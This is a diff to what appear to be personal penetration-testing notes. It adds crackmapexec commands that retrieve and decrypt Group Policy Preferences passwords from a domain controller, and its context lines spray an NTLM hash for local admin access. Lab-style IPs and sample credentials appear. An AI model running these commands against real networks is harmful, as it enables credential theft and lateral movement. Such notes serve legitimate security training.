@@ -48,6 +48,8 @@ sudo crackmapexec smb --local-auth <cidr range> -u <username> -p <passwd> | grep
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
 
+^d499fd
+
 ^cc2b19
 ###### Domain user enumeration w/ creds
 ```bash
@@ -90,3 +92,12 @@ sudo crackmapexec smb <target ip> -u <user> -p <passwd> -M spider_plus --share '
 ```
 
 ^c5e901
+
+##### Retrieve and decrypt gpp password
+```bash
+# this will find the cpassword in the gpp registry XML then decrypt it for you
+crackmapexec smb <dc ip> -u <user> -p <passwd> -M gpp_autologin
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+```
+
+^1d481a
